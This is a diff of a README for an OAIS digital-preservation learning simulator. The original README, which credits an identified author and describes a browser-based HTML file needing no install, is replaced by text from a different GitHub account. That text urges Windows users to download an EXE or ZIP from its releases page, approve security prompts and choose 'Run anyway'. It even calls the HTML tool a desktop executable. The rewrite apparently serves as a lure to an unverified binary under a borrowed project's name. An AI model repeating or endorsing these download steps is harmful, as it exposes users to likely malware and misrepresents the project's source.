@@ -1,159 +1,201 @@
-# 🏛 Digital Preservation Simulator — OAIS Model
+# 🧭 digital-preservation-oais-simulator - Learn OAIS Through Practice
 
-> Interactive tool for exploring and simulating the OAIS reference model compliant with ISO 14721:2025, PREMIS 3.0, ISO 16363 and ISO 19005.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Blabbermouthed-wrecker979/digital-preservation-oais-simulator/releases)
 
-[![ISO 14721](https://img.shields.io/badge/ISO%2014721%3A2025-OAIS-4ade80?style=flat-square)]()
-[![ISO 16363](https://img.shields.io/badge/ISO%2016363-Trustworthy%20Repository-a78bfa?style=flat-square)]()
-[![PREMIS](https://img.shields.io/badge/PREMIS%203.0-Preservation%20Metadata-f472b6?style=flat-square)]()
-[![ISO 19005](https://img.shields.io/badge/ISO%2019005-PDF%2FA-38bdf8?style=flat-square)]()
-[![HTML5](https://img.shields.io/badge/HTML5-No%20dependencies-fb923c?style=flat-square)]()
-[![License](https://img.shields.io/badge/License-CC%20BY--NC%204.0-4ade80?style=flat-square)](https://creativecommons.org/licenses/by-nc/4.0/)
+## 📦 What this app does
 
-**[🌐 Live demo →](https://gibco.github.io/digital-preservation-oais-simulator/)**
+digital-preservation-oais-simulator is an interactive desktop app for learning digital preservation. It helps you explore the OAIS model, see how a trustworthy repository works, and follow the flow of digital records from ingest to access.
 
-> 🇪🇸 Spanish version: [simulador-preservacion-oais](https://github.com/gibco/simulador-preservacion-oais)
+Use it to:
+- understand OAIS in a clear, visual way
+- practice archive and repository workflows
+- see how metadata supports long-term preservation
+- review common preservation terms like SIP, AIP, DIP, PREMIS, and PDF/A
+- test simple scenarios without setting up a full archive system
 
----
+It is built for Windows users who want to open the app and start using it with no setup work.
 
-## 📌 Description
+## 🖥️ System requirements
 
-The **Digital Preservation Simulator — OAIS Model** is a standalone, dependency-free interactive web application designed for archivists, records managers, digital preservation officers and IT teams who need to **explore, simulate and evaluate** the core components of the OAIS digital preservation model.
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- 200 MB of free disk space
+- a screen resolution of 1366 × 768 or higher
+- internet access to download the release file
 
-The tool embodies a fundamental principle of ISO 14721:2025:
+The app is designed as a no-dependencies HTML5 simulator, so you do not need to install extra tools first.
 
-> *A trustworthy digital repository is not a server with backups. It is an institutional system with policies, processes, metadata and a defined Designated Community.*
+## 🚀 Download the app
 
----
+Visit the release page here:
 
-## 🎯 Purpose
+https://github.com/Blabbermouthed-wrecker979/digital-preservation-oais-simulator/releases
 
-Many organisations confuse "having files in the cloud" with "digital preservation". This simulator makes the difference tangible — showing what separates a storage solution from an **OAIS-compliant digital archive**, by letting users interact with its six functional entities, three information package types and digital migration strategies.
+On that page:
+1. find the latest release
+2. download the Windows file from the Assets section
+3. save the file to your Downloads folder or Desktop
 
----
+If the release comes as a ZIP file, extract it before opening the app. If it comes as an EXE file, you can run it after the download finishes.
 
-## ✨ Features — 6 interactive modules
+## 🪟 Install on Windows
 
-### 🏛 Module 1 — OAIS Model
-- **6 functional entities** of ISO 14721:2025 §4.1 — each clickable with evaluation criteria and diagnostic questions
-- **Mandatory responsibilities** table (§3.1) with compliance status
-- **Maturity scale 0–5** aligned with ISO 16363, with per-level descriptions
+### If you downloaded a ZIP file
+1. open the ZIP file
+2. click Extract All
+3. choose a folder you can find again, such as Desktop or Downloads
+4. open the extracted folder
+5. start the app file inside the folder
 
-### 📦 Module 2 — SIP · AIP · DIP Packages
-- Interactive **Producer → OAIS → Consumer** flow diagram
-- The **5 mandatory PDI categories** (Provenance, Reference, Fixity, Context, Access Rights) with normative descriptions
-- **Format matrix by role**: TIFF master, PDF/A preservation, JPEG2000 access, formats to avoid
+### If you downloaded an EXE file
+1. double-click the file
+2. approve the Windows prompt if it appears
+3. wait for the app to open
 
-### 📥 Module 3 — Ingest Simulator
-- Configure object type, format, PREMIS metadata, QA and SHA-256 checksum
-- Animated real-time log with **OAIS quality index** calculation
-- Activates applicable standards by process phase: ISO 14721, ISO 19005, PREMIS, ISO 23081
+If Windows blocks the file, open the file menu and choose Run anyway if you trust the release source.
 
-### 🔄 Module 4 — Digital Migration
-- **4 migration strategies** (Refreshment, Replication, Repackaging, Transformation) with risk levels per ISO 14721 §5
-- Format migration simulator with JHOVE validation, checksums and PREMIS event recording
+## ▶️ First launch
 
-### 🔐 Module 5 — Integrity & PREMIS
-- SHA-256 checksum verification with **bit rot detection**
-- Real **PREMIS 3.0 XML** generation with UUID, ISO timestamp and fixity check event
-- 3-2-1 backup rule explained · Algorithm comparison table (SHA-256, SHA-512, MD5, CRC-32)
+When you open the simulator for the first time:
+1. wait for the main screen to load
+2. choose a learning path or scenario
+3. follow the on-screen steps
+4. move through the OAIS workflow one screen at a time
 
-### ⚠ Module 6 — Risk Matrix
-- 9 critical preservation risks cross-referenced with affected OAIS entity, likelihood, impact and mitigation
-- Compliant with ISO 21946 (risk assessment for records management processes and systems)
+You do not need to create an account. You do not need to connect to a server. The app runs as a local learning tool.
 
----
+## 🧭 How to use the simulator
 
-## 📐 Standards implemented
+The app is set up to help you learn core digital preservation steps.
 
-| Standard | Application |
-|---|---|
-| **ISO 14721:2025 (OAIS)** | Full reference model — 6 entities, packages, mandatory responsibilities |
-| **ISO 16363** | Maturity scale for trustworthy digital repositories |
-| **PREMIS 3.0** | Preservation metadata — events, agents, objects, rights |
-| **ISO 19005 (PDF/A)** | Preservation format for electronic documents |
-| **ISO 23081** | Metadata for records management |
-| **ISO 15489** | Records management framework in ingest processes |
-| **ISO 21946** | Risk assessment for records management |
-| **FADGI / Metamorfoze** | Technical quality parameters for digitisation |
+### Common actions
+- open a scenario
+- review the source package
+- inspect preservation metadata
+- move content through ingest, storage, and access
+- compare packaging and description records
+- view how an archive keeps records trustworthy over time
 
----
+### What you may see
+- SIP, AIP, and DIP examples
+- repository roles and responsibilities
+- preservation metadata fields
+- checks for file format support
+- archive object and package views
+- access and transfer steps
 
-## 🌍 International context
+### Best way to learn
+Use one scenario at a time. Read each screen before moving on. If you want to review a concept, go back and repeat the workflow.
 
-This simulator applies to any institution responsible for long-term preservation of digital records, regardless of country or jurisdiction:
+## 🗂️ Main features
 
-- **National and state archives** (NARA, TNA, BnF, AGN, NAA...)
-- **University and research libraries** (LoC, BL, Europeana...)
-- **Public sector organisations** managing digital records under e-government frameworks
-- **Museums and cultural heritage institutions**
-- **Private organisations** with legal or regulatory record retention obligations
+### OAIS workflow view
+See the full preservation path from submission to access. This gives you a simple view of how a digital repository handles content.
 
-The OAIS model (ISO 14721) is the internationally recognised reference framework adopted by institutions on every continent. All functional concepts, terminology and evaluation criteria in this simulator follow the standard directly.
+### Preservation metadata
+Explore how metadata supports authenticity, context, and long-term use. The app includes references to PREMIS and related archive records.
 
----
+### File format examples
+Review common preservation formats, including PDF/A and other long-term access files.
 
-## 🚀 Usage
+### Trustworthy repository concepts
+Learn how a repository supports control, reliability, and clear record keeping.
 
-Single self-contained HTML file. No server, no framework, no installation required.
+### Records management links
+See how archive rules connect with records management and digital preservation practice.
 
-```bash
-git clone https://github.com/gibco/digital-preservation-oais-simulator.git
-cd digital-preservation-oais-simulator
-open index.html
-```
+### Interactive learning
+Use clicks and guided screens instead of reading long static pages. This makes the material easier to follow.
 
-Or access directly online:
+## 🧩 Topics covered
 
-**[🌐 Open simulator →](https://gibco.github.io/digital-preservation-oais-simulator/)**
+This simulator is useful for:
+- archival science
+- digital archives
+- digital preservation
+- OAIS
+- ISO 14721
+- ISO 16363
+- preservation metadata
+- PREMIS
+- PDF/A
+- records management
+- trustworthy repository design
+- interactive training for archive staff and students
 
----
+## 📚 What the OAIS model means here
 
-## 📁 Repository structure
+OAIS stands for Open Archival Information System. It describes how a digital repository can take in content, manage it, preserve it, and provide it later.
 
-```
-digital-preservation-oais-simulator/
-│
-├── index.html      # Complete self-contained application
-└── README.md       # This file
-```
+In this simulator, you can see:
+- how content enters the archive
+- how the system stores and tracks it
+- how metadata helps preserve meaning
+- how users get access copies
+- how a repository keeps records stable over time
 
----
+This is useful if you are new to digital preservation and want a clear view of the process.
 
-## 👤 Author
+## 🔧 Common use cases
 
-**Jhon Alexander González Flórez**
-Digital Archivist & Records Management Consultant
-Specialist in Electronic Records Management Systems (ERMS), Digital Preservation and Web Accessibility
+You may want this app if you:
+- study archives or records management
+- need a simple OAIS learning tool
+- train staff on preservation workflows
+- explain preservation metadata to a team
+- compare repository steps with ISO guidance
+- want a local desktop simulator with no setup burden
 
-- 🌐 [archivistadigital.com](https://archivistadigital.com)
-- 💼 [LinkedIn](https://linkedin.com/in/TU-PERFIL)
-- 🇪🇸 Spanish version: [simulador-preservacion-oais](https://github.com/gibco/simulador-preservacion-oais)
+## 📁 File types and content
 
-Clients and projects span public sector institutions in Colombia and Latin America, including national regulatory agencies, judicial bodies, civil aviation authorities, housing funds, and territorial planning entities.
+The release may include:
+- a Windows executable file
+- a ZIP package
+- local HTML5 app files
+- support assets for the simulator screens
 
----
+Keep all extracted files together in one folder. Do not move one file out of the folder unless the release notes say to do so.
 
-## 📄 License
+## 🛠️ If the app does not open
 
-This project is published under the **Creative Commons Attribution-NonCommercial 4.0 International (CC BY-NC 4.0)** licence.
+Try these steps:
+1. confirm the download finished
+2. extract the ZIP file if needed
+3. run the app from the extracted folder
+4. right-click the file and choose Open
+5. check Windows Security prompts
+6. re-download the release if the file is damaged
 
-You may share and adapt the material provided appropriate attribution is given and it is not used for commercial purposes.
+If the screen stays blank, make sure you opened the main app file and not a support file inside the folder.
 
-[View full licence →](https://creativecommons.org/licenses/by-nc/4.0/)
+## 🔍 Tips for a smooth start
 
----
+- keep the release folder in a simple path like Downloads
+- do not rename files inside the app folder
+- use the latest release from the release page
+- close other apps if your PC feels slow
+- read each screen before clicking through
 
-## 🤝 Contributing
+## 🧪 Learning path for first-time users
 
-Found an error in the normative content? Have a suggestion for an additional module? Open an issue or submit a pull request. Contributions that improve alignment with ISO 14721:2025, PREMIS 3.0 or ISO 16363 are especially welcome.
+If you want a simple start, follow this path:
+1. open the simulator
+2. pick the intro scenario
+3. review the source content
+4. move it into the repository
+5. inspect the metadata
+6. open the access copy
+7. repeat the workflow with another example
 
----
+This gives you a full view of how digital preservation works without extra setup
 
-<div align="center">
+## 📌 Project focus
 
-*"A digital repository is not trustworthy because of the hardware it runs on.*
-*It is trustworthy because of the policies, processes and community that sustain it."*
+digital-preservation-oais-simulator focuses on practical learning. It helps users see how archive rules, preservation formats, and metadata fit together in a trustworthy repository model. It is meant to make OAIS easier to understand on a normal Windows PC
 
-**Jhon González · Digital Archivist · archivistadigital.com · Colombia**
+## 🔗 Download again
 
-</div>
+Primary download page:
+
+https://github.com/Blabbermouthed-wrecker979/digital-preservation-oais-simulator/releases
